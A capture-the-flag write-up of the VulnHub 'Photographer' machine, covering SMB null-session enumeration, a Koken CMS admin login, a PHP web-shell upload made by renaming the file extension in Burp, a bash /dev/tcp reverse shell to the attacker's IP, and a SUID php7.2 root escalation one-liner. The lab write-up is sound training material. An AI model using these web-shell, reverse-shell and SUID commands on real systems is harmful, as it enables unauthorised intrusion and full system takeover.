## Photographer VulnHub Challenge Writeup

### Overview

Photographer is a VulnHub machine that involves network reconnaissance, SMB enumeration, web application analysis (Koken CMS), file upload vulnerability exploitation, and privilege escalation via a SUID binary. This writeup details the steps taken to gain root access and retrieve the final flag.

### Reconnaissance

#### Network Scanning

I started by identifying the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.21` with MAC Address `08:00:27:C4:FB:67` (PCS Systemtechnik/Oracle VirtualBox virtual NIC).

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.21 -p-
```

**Results:**

- **80/tcp**: `http` Apache httpd 2.4.18 ((Ubuntu))
- **139/tcp**: `netbios-ssn` Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- **445/tcp**: `netbios-ssn` Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- **8000/tcp**: `http` Apache httpd 2.4.18 ((Ubuntu))


The host was named `PHOTOGRAPHER`.

### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80:

```shellscript
gobuster dir -u http://192.168.1.21/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Results:**

- `/images` (Status: 301)
- `/assets` (Status: 301)
- `/server-status` (Status: 403)


A subsequent `gobuster` scan with `raft-medium-files-lowercase.txt` revealed:

- `/index.html` (Status: 200)
- `/index.html.old` (Status: 200)


I also ran `nikto` for a more in-depth web server scan on port 80:

```shellscript
nikto -h http://192.168.1.21/
```

**Key findings from Nikto:**

- Apache/2.4.18 is outdated.
- `/images/` directory indexing is enabled.
- Internal IP address `127.0.1.1` was disclosed in the `Location` header for `/images`.


### SMB Enumeration

I listed available SMB shares using `smbclient`:

```shellscript
smbclient -L //192.168.1.21
```

**Shares found:**

- `print$` (Disk)
- `sambashare` (Disk) - Comment: "Samba on Ubuntu"
- `IPC$` (IPC)


I then used `enum4linux-ng` for more detailed SMB enumeration:

```shellscript
enum4linux-ng 192.168.1.21
```

`enum4linux-ng` confirmed the shares and indicated that `sambashare` was accessible for mapping and listing.

I connected to the `sambashare` without a password (null session):

```shellscript
smbclient //192.168.1.21/sambashare -N
```

Inside the share, I found two interesting files:

- `mailsent.txt`
- `wordpress.bkp.zip`


I downloaded both files using `mget`:

```shellscript
smb: \> mget *
```

### File Analysis

I examined `mailsent.txt`:

```shellscript
cat mailsent.txt
```

The content of `mailsent.txt` was an email from "Agi Clarence" to "Daisa Ahomi" with the subject "To Do - Daisa Website's". The most important line was: "Don't forget your secret, my babygirl ;)". This strongly hinted at `babygirl` being a password for `Daisa`.

Next, I unzipped `wordpress.bkp.zip`:

```shellscript
unzip wordpress.bkp.zip
```

This created a `wordpress` directory, but it didn't immediately reveal any new credentials or critical information.

### Web Enumeration (Port 8000 - Koken CMS)

I revisited port 8000, which was also running an Apache web server. Initial `gobuster` scans failed due to the server returning 301 redirects for non-existent URLs. I adjusted the `gobuster` command to exclude these status codes:

```shellscript
gobuster dir -u http://192.168.1.21:8000/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt \
  -b 301,302
```

This revealed `index.php` (Status: 200) and other common PHP files.

I then used `curl` to inspect the content of port 8000:

```shellscript
curl http://192.168.1.21:8000/
```

The HTML source code revealed that the website was running **Koken 0.22.24**, a content management system for photographers, and mentioned "daisa ahomi" as the author. This confirmed the connection to the email found earlier.

## Initial Foothold

### Koken Admin Login

Given the Koken CMS and the email hint, I navigated to the Koken admin login page, typically at `/admin/`.

<img width="1261" height="616" alt="image" src="https://github.com/user-attachments/assets/cb1f8dbe-0211-47d5-8c01-71dde8f2b6fd" />


I attempted to log in using the email address `daisa@photographer.com` (from `mailsent.txt`) and the password `babygirl` (from the email hint). This was successful.

After logging in, I was presented with the Koken Library.

<img width="1212" height="573" alt="image" src="https://github.com/user-attachments/assets/07501fea-c00b-4039-b804-3f273d602eca" />


### File Upload Vulnerability

I explored the Koken admin panel and found an "Import content" feature, which allows uploading images and videos.

<img width="1037" height="643" alt="image" src="https://github.com/user-attachments/assets/644a554c-d45e-48fb-b78c-e788f7fa9c14" />


The allowed file types were JPG, PNG, GIF, MP4. This suggested a potential file upload vulnerability.

I created a simple PHP web shell:

```php
<?php exec($_GET["cmd"]); ?>
```

I saved this as `shell.png`. My initial attempt to upload `shell.php.png` (a PHP shell disguised as a PNG, as used in a previous challenge) directly through the Koken interface resulted in it being treated as an image, not executed.

The key was to intercept the upload request using Burp Suite and change the filename extension from `.png` to `.php` in the HTTP request.

<img width="1038" height="687" alt="image" src="https://github.com/user-attachments/assets/f800fdcf-e01b-4097-ad2d-fb1d3a052c16" />


After modifying the request in Burp Suite and forwarding it, the upload was successful, and the Koken interface showed "1 items finished uploading to the Library".

<img width="1366" height="685" alt="image" src="https://github.com/user-attachments/assets/683e34da-25c8-4ca0-83fe-3e29193cd0a4" />


The uploaded shell was located at `/var/www/html/koken/storage/originals/47/1c/shell.php` (the `47/1c` part is a dynamically generated path based on Koken's internal storage).

## Reverse Shell

I set up a `netcat` listener on my attacking machine (Kali Linux) on port 4444:

```shellscript
nc -lnvp 4444
```

Then, I triggered the web shell by navigating to the uploaded file's URL with a `cmd` parameter containing a reverse shell command. The URL looked something like this:

`http://192.168.1.21:8000/storage/originals/47/1c/shell.php?cmd=/bin/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.6/4444%200%3E%261%22`

<img width="993" height="406" alt="image" src="https://github.com/user-attachments/assets/cc1e9524-9cae-4711-9879-70e2a225fff0" />


Upon accessing this URL, I received a reverse shell on my `netcat` listener as the `www-data` user:

```plaintext
Connection received on 192.168.1.21 48084
bash: cannot set terminal process group (1242): Inappropriate ioctl for device
bash: no job control in this shell
www-data@photographer:/var/www/html/koken/storage/originals/47/1c$
```

I then upgraded to a proper TTY shell for better interaction:

```shellscript
python -c "import pty;pty.spawn('/bin/bash')"
```

### Initial Enumeration as `www-data`

I navigated to the Koken configuration directory to find database credentials:

```shellscript
www-data@photographer:/var/www/html/koken/storage/originals/47/1c$ cd /var/www/html/koken/storage/configuration
www-data@photographer:/var/www/html/koken/storage/configuration$ cat database.php
```

**Database credentials found:**

```php
<?php
        return array(
                'hostname' => 'localhost',
                'database' => 'koken',
                'username' => 'kokenuser',
                'password' => 'user_password_here',
                'prefix' => 'koken_',
                'socket' => ''
        );
```

The password was `user_password_here`. This could be useful for database access, but wasn't directly needed for privilege escalation in this path.

I also checked `key.php` in the same directory:

```shellscript
www-data@photographer:/var/www/html/koken/storage/configuration$ cat key.php
```

This file contained a key: `fb3ab2ea3b3ad12c42c064d680826832`.

I then explored the `/home` directory to find user accounts:

```shellscript
www-data@photographer:/var/www/html/koken/storage/configuration$ cd /home
www-data@photographer:/home$ ls
agi  daisa  lost+found
```

I found `agi` and `daisa`. I checked `daisa`'s home directory:

```shellscript
www-data@photographer:/home$ cd daisa
www-data@photographer:/home/daisa$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  examples.desktop  user.txt
www-data@photographer:/home/daisa$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

**User Flag:** `d41d8cd98f00b204e9800998ecf8427e`

I attempted to switch user to `daisa` using the password `babygirl` (from `mailsent.txt`), but it failed.

```shellscript
www-data@photographer:/home/daisa$ su daisa
Password: babygirl
su: Authentication failure
```

## Privilege Escalation

I searched for SUID binaries on the system:

```shellscript
find / -perm -4000 2> /dev/null
```

**Key finding:**

- `/usr/bin/php7.2`


I checked the permissions of `/usr/bin/php7.2`:

```shellscript
ls -l /usr/bin/php7.2
```

The `s` permission bit (`-rws`) indicates that `php7.2` is a SUID binary, meaning it runs with the permissions of its owner (`root`). This is a common misconfiguration that can be exploited.

Since `php7.2` is SUID, I can execute PHP code with root privileges. I used the `posix_setuid(0)` function to change the effective user ID to root (0) and then executed a bash shell.

```shellscript
www-data@photographer:/var/www/html/koken/storage/originals/47/1c$ /usr/bin/php7.2 -r "posix_setuid(0); system('/bin/bash');"
```

This immediately granted me a root shell:

```plaintext
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

The `uid=0(root)` confirms that I have successfully escalated privileges to root.

## Root Flag

Finally, I navigated to the `/root` directory to find the `proof.txt` file.

```shellscript
cd /root
ls
proof.txt
cat proof.txt
```

**Root Flag:** `d41d8cd98f00b204e9800998ecf8427e` (This appears to be the same as the user flag, which is unusual but sometimes happens in CTFs).

The `proof.txt` also contained an ASCII art image and a message:

```plaintext
Follow me at: http://v1n1v131r4.com
```

## Conclusion

The Photographer challenge was a comprehensive exercise involving network and SMB enumeration to discover hidden files and credentials. The key to initial access was exploiting a file upload vulnerability in the Koken CMS by manipulating the file extension via Burp Suite. Privilege escalation was achieved by leveraging a misconfigured SUID `php7.2` binary to gain a root shell.

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `nikto` - Web server vulnerability scanning
- `smbclient` - SMB share interaction
- `enum4linux-ng` - Detailed SMB enumeration
- `unzip` - Extracting zip archives
- `curl` - Interacting with web servers
- `netcat` - Setting up listeners for reverse shells
- `Burp Suite` - Intercepting and modifying HTTP requests
- `php7.2` - Exploiting SUID binary for privilege escalation


## Flags Found

1. **User Flag:** `d41d8cd98f00b204e9800998ecf8427e` (Found in `/home/daisa/user.txt`)
2. **Root Flag:** `d41d8cd98f00b204e9800998ecf8427e` (Found in `/root/proof.txt`)


SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationExplore other Koken CMS vulnerabilitiesPractice SUID binary exploitationLearn more about SMB enumerationAutomate web shell generationAnalyze WordPress backup filesScroll leftScroll right
